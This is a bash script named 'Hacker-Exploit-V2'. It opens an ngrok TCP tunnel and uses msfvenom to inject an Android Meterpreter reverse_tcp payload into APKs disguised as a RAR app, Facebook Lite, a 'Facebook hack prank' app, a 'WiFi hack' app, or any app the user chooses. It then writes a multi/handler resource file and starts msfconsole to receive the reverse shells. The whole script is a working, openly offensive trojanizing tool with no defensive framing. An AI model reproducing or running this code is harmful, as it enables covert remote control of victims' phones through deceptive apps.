#!/bin/bash

LPARTH=`pwd`



clear
	#color input ==============================================================
	RED=$'\e[1;31m'
GREEN=$'\e[1;32m'
YELLOW=$'\e[1;33m'
BLUE=$'\e[1;34m'
RESTORE=$'\e[0m'
chmod 777 *




clear

#logo or name
	echo "${GREEN} WELCOME TO The ${RESTORE}"
	echo "${RESTORE}"
	echo "${YELLOW}"

echo "                                                                                                          "     
echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
echo "                                                                                                          "
egrep -i ver toolinfo;
echo "${RESTORE}"
echo "${RED}=============================================================================================================="
echo "${RESTORE}"

	
	#echo "${GREEN}your ip info.. "
	
	xterm -hold -T "Hacker-Exploit-V2" -e "$LPARTH/ngrok tcp 8080" &
	sleep 2.3;

	
	echo "${RESTORE}"
	echo "EXAMPLE :  tcp://${GREEN}0.tcp.ngrok.io${RESTORE}:${YELLOW}18326 ${RESTORE}-> localhost:8080  "
	echo "EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your tcp lhost and ${YELLOW}Yellow${RESTORE} color is your current lport ) "
	echo "${RESTORE}"	
	echo " please input your current NGROK URL Exampul : ( 0.tcp.ngrok.io ) "
	read -p ' HE :~' IP

	echo " please input your NGROK Port number Example : ( 18326 ) "
	read -p ' HE :~ ' PORT

	































	#clear input from ======================================================= 

	clear 

	#logo display ==============================================================

		echo "${GREEN}"
	echo " WELCOME TO The "
	echo "${BLUE}"
	echo "                                                                                                          "     
	echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
	echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
	echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
	echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
	echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
	echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
	echo "                                                                                                          "
	egrep -i ver toolinfo;


			echo "${RESTORE}"
	echo "=============================================================================================================="
	echo "your LHOST or local ip was set ${YELLOW}'$IP' ${RESTORE}"
	echo "your LPORT or local port was set ${YELLOW}'$PORT' ${RESTORE}"
	
	
	echo "=============================================================================================================="
echo "${YELLOW}"

	


	echo "Select your Application "
echo ""


	select planet in "Rar-apk" "Fb-lite" "Fb-hack-prank-apk" "Wifi-hack" "Castom" "Back"

	do
	if [ "$planet" == Rar-apk ]

		then
			

			#ALL - ACTION RUN =====================================================================================
			
			echo " please input your Output App name "
			echo "${YELLOW}EXAMPUL : ${BLUE}correct spelling : ${GREEN}[ WH-hackerexploit ] ${RESTORE}and ${BLUE}Wrong spelling : ${RED} [ WH hackerexploit ]"
			echo "${YELLOW} Must be use [ _  or - ] don't use [ ] Space"
			read -p ${RESTORE}' HE :~ ' APPNAME 
echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""



			rm -rf $LPARTH/WH-output
			mkdir $LPARTH/WH-output
			#msg =============================================================
			echo "${YELLOW}Createing payload and inject payload into apk" 
			echo "${GREEN}"
			#OUTPUT ============================================================== 
			 sudo msfvenom -x $LPARTH/applicationpkg/rar.apk -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/WH-output/$APPNAME.apk
			
			#clear temp data and cteate new temp files.


			rm -rf $LPARTH/temp
			mkdir $LPARTH/temp
			sleep 0.80;
			touch $LPARTH/temp/$APPNAME.rc 
			
			#exquate ip & port & handeler & payload  ===============================================

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST localhost " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT 8080 " >> $LPARTH/temp/$APPNAME.rc

			#msg =============================================================
			echo ""
			echo ""
			echo " ==========================100%==========================="


			#Sleep & clear & logo display ==============================================================
		
			sleep 7.1;
		
			clear
	

			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${BLUE}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			echo "=============================================================================================================="
			echo "your NGROK LHOST was set ${GREEN}'localhost' ${RESTORE}${YELLOW}"
			echo "your NGROK LPORT / local port was set ${GREEN}'8080'${RESTORE}${YELLOW} "
			echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE}${YELLOW} "
			echo "opening msfconsole  "
			echo "=============================================================================================================="

			echo "${RESTORE}"


			msfconsole -r $LPARTH/temp/$APPNAME.rc

			bash $LPARTH/actions/ng-android-AVB..sh
			#ALL - ACTION COMPLETE =====================================================================================







































		elif [ "$planet" == Fb-lite ]
		then
		     
		  #ALL - ACTION RUN =====================================================================================
			echo " please input your Output App name "
			echo "${YELLOW}EXAMPUL : ${BLUE}correct spelling : ${GREEN}[ WH-hackerexploit ] ${RESTORE}and ${BLUE}Wrong spelling : ${RED} [ WH hackerexploit ]"
			echo "${YELLOW} Must be use [ _  or - ] don't use [ ] Space"
			read -p ${RESTORE}' HE :~ ' APPNAME 

echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""


			rm -rf $LPARTH/WH-output
			mkdir $LPARTH/WH-output
			#msg =============================================================
			echo "${YELLOW}Createing payload and inject payload into apk" 
			echo "${GREEN}"
			#OUTPUT ============================================================== 
			
			FbVe=$(zenity --title "☠ Please Select Venerable APK ☠" --filename=$IPATH --file-selection --text "chose Android Application to use (.APK)") > /dev/null 2>&1
		
			sudo msfvenom -x $FbVe -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/WH-output/$APPNAME.apk
			
			#clear temp data and cteate new temp files.


			rm -rf $LPARTH/temp
			mkdir $LPARTH/temp
			sleep 0.80;
			touch $LPARTH/temp/$APPNAME.rc 
			
			#exquate ip & port & handeler & payload  ===============================================

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST localhost " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT 8080 " >> $LPARTH/temp/$APPNAME.rc

			#msg =============================================================
			
			echo " ======================100%======================"


			#Sleep & clear & logo display ==============================================================
		
			sleep 7.1;
		
			clear
	

			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${BLUE}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			echo "=============================================================================================================="
			echo "your NGROK LHOST or local ip was set ${GREEN}'localhost' ${RESTORE}${YELLOW}"
			echo "your NGROK LPORT or local port was set ${GREEN}'8080'${RESTORE}${YELLOW} "
			echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE}${YELLOW} "
			echo "opening msfconsole  "
			echo "=============================================================================================================="

			echo "${RESTORE}"


			msfconsole -r $LPARTH/temp/$APPNAME.rc

			
bash $LPARTH/actions/ng-android-AVB..sh
			#ALL - ACTION COMPLETE =====================================================================================





		elif [ "$planet" == Fb-hack-prank-apk ]
		then
		    
		    #ALL - ACTION RUN =====================================================================================
						
			echo " please input your Output App name "
			echo "${YELLOW}EXAMPUL : ${BLUE}correct spelling : ${GREEN}[ WH-hackerexploit ] ${RESTORE}and ${BLUE}Wrong spelling : ${RED} [ WH hackerexploit ]"
			echo "${YELLOW} Must be use [ _  or - ] don't use [ ] Space"
			read -p ${RESTORE}' HE :~ ' APPNAME 

echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""


			rm -rf $LPARTH/WH-output
			mkdir $LPARTH/WH-output
			#msg =============================================================
			echo "${YELLOW}Createing payload and inject payload into apk" 
			echo "${GREEN}"
			#OUTPUT ============================================================== 
			sudo msfvenom -x $LPARTH/applicationpkg/fbprank.apk -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/WH-output/$APPNAME.apk
			
			#clear temp data and cteate new temp files.


			rm -rf $LPARTH/temp
			mkdir $LPARTH/temp
			sleep 0.80;
			touch $LPARTH/temp/$APPNAME.rc 
			
			#exquate ip & port & handeler & payload  ===============================================

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST localhost " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT 8080 " >> $LPARTH/temp/$APPNAME.rc

			#msg =============================================================
			
			echo " ======================100%======================"


			#Sleep & clear & logo display ==============================================================
		
			sleep 7.1;
		
			clear
	

			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${BLUE}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			echo "=============================================================================================================="
			echo "your NGROK LHOST or local ip was set ${GREEN}'$IP' ${RESTORE}${YELLOW}"
			echo "your NGROK LPORT or local port was set ${GREEN}'$PORT'${RESTORE}${YELLOW} "
			echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE}${YELLOW} "
			echo "opening msfconsole  "
			echo "=============================================================================================================="

			echo "${RESTORE}"


			msfconsole -r $LPARTH/temp/$APPNAME.rc

		bash $LPARTH/actions/ng-android-AVB..sh
			#ALL - ACTION COMPLETE =====================================================================================

















		elif [ "$planet" == Wifi-hack ]
		then
		    
		    #ALL - ACTION RUN =====================================================================================
						
			echo " please input your Output App name "
			echo "${YELLOW}EXAMPUL : ${BLUE}correct spelling : ${GREEN}[ WH-hackerexploit ] ${RESTORE}and ${BLUE}Wrong spelling : ${RED} [ WH hackerexploit ]"
			echo "${YELLOW} Must be use [ _  or - ] don't use [ ] Space"
			read -p ${RESTORE}' HE :~ ' APPNAME 

echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""


			rm -rf $LPARTH/WH-output
			mkdir $LPARTH/WH-output
			#msg =============================================================
			echo "${YELLOW}Createing payload and inject payload into apk" 
			echo "${GREEN}"
			#OUTPUT ============================================================== 
			sudo msfvenom -x $LPARTH/applicationpkg/Wifi-hack.apk -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/WH-output/$APPNAME.apk
			
			#clear temp data and cteate new temp files.


			rm -rf $LPARTH/temp
			mkdir $LPARTH/temp
			sleep 0.80;
			touch $LPARTH/temp/$APPNAME.rc 
			
			#exquate ip & port & handeler & payload  ===============================================

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST localhost " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT 8080 " >> $LPARTH/temp/$APPNAME.rc

			#msg =============================================================
			
			echo " ======================100%======================"


			#Sleep & clear & logo display ==============================================================
		
			sleep 7.1;
		
			clear
	

			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${BLUE}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			echo "=============================================================================================================="
			echo "your NGROK LHOST or local ip was set ${GREEN}'$IP' ${RESTORE}${YELLOW}"
			echo "your NGROK LPORT or local port was set ${GREEN}'$PORT'${RESTORE}${YELLOW} "
			echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE}${YELLOW} "
			echo "opening msfconsole  "
			echo "=============================================================================================================="

			echo "${RESTORE}"


			msfconsole -r $LPARTH/temp/$APPNAME.rc

		bash $LPARTH/actions/ng-android-AVB..sh
			#ALL - ACTION COMPLETE =====================================================================================


























		elif [ "$planet" == Castom ]
		then
		   
		     #ALL - ACTION RUN =====================================================================================
		



			clear
	

			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${BLUE}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			echo "=============================================================================================================="
									
			echo "=============================================================================================================="
			echo "your LHOST or local ip was set ${GREEN}'$IP' ${RESTORE}"
			echo "${YELLOW}"			
			echo "your LPORT or local port was set ${GREEN}'$PORT'${RESTORE} "
			echo "${YELLOW}"
		
			echo "=============================================================================================================="
			echo "=============================================================================================================="

			echo "${RESTORE}"





			echo "${YELLOW}NOTE : ${BLUE}[Fast past your Application into  ${GREEN}( $LPARTH/APP/ ) ${RESTORE}directory]"
			
			echo "${YELLOW}EXAMPUL : ${BLUE}correct spelling : ${GREEN}[ WH-hackerexploit or WH_hackerexploit] ${RESTORE}and ${BLUE}Wrong spelling : ${RED} [ WH hackerexploit ]  . "
			echo "${YELLOW}Must be use [ _  or - ] don't use [ ] Space"
			echo "${RESTORE}"
			echo "please input your Output App name "			
			read -p ${RESTORE}' HE :~ ' INAPP 



echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""


		
			rm -rf $LPARTH/WH-output
			mkdir $LPARTH/WH-output
			#msg =============================================================
			echo "${YELLOW}Createing payload and inject payload into apk" 
			echo "${GREEN}"
			#OUTPUT ============================================================== 
			sudo msfvenom -x $LPARTH/APP/$INAPP.apk -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/WH-output/$INAPP.apk
			
			#clear temp data and cteate new temp files.


			rm -rf $LPARTH/temp
			mkdir $LPARTH/temp
			sleep 0.80;
			touch $LPARTH/temp/$INAPP.rc 
			
			#exquate ip & port & handeler & payload  ===============================================

			echo " use multi/handler" >> $LPARTH/temp/$INAPP.rc 
			echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$INAPP.rc
			echo " set LHOST localhost " >> $LPARTH/temp/$INAPP.rc
			echo " set LPORT 8080 " >> $LPARTH/temp/$INAPP.rc

			#msg =============================================================
			
			echo " ======================100%======================"


			#Sleep & clear & logo display ==============================================================
		
			sleep 7.1;
		
			clear
	

			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${BLUE}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			echo "=============================================================================================================="
			echo "your NGROK LHOST or local ip was set ${GREEN}'$IP' ${RESTORE}${YELLOW}"
			echo "your NGROK LPORT or local port was set ${GREEN}'$PORT'${RESTORE} ${YELLOW}"
			echo "your output app name was set ${GREEN}'$INAPP'${RESTORE} ${YELLOW}"
			echo "opening msfconsole  "
			echo "=============================================================================================================="

			echo "${RESTORE}"


			msfconsole -r $LPARTH/temp/$INAPP.rc


			bash $LPARTH/actions/ng-android-AVB..sh
			#ALL - ACTION COMPLETE =====================================================================================




		elif [ "$planet" == Back ]
		then
		   bash $LPARTH/netac.sh


	fi
	done





















: <<'END_COMMENT'
====================================================================================================================================================
#OUTPUT 

echo " ===============loading-100%================="

echo "file creating while 3 of 2 min "

#msfvenom -p android/meterpreter/reverse_tcp Lhost=$IP Lport=$PORT R > 
#msfvenom -x $INAPP -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/$APPNAME.apk
#temp  file creating or remove .

echo "checking temp file and clear case data and temp dir for better perform "



rm -rf $LPARTH/temp


echo " ======================100%======================"

echo " Creating a msf temp dir" 


mkdir $LPARTH/temp

touch $LPARTH/temp/$APPNAME.rc 

#exquate ip & port & handeler & payload 

echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
echo " set LHOST $IP " >> $LPARTH/temp/$APPNAME.rc
echo " set LPORT $PORT " >> $LPARTH/temp/$APPNAME.rc

echo " opening msfconsole  "


msfconsole -r $LPARTH/temp/$APPNAME.rc

END_COMMENT
done 
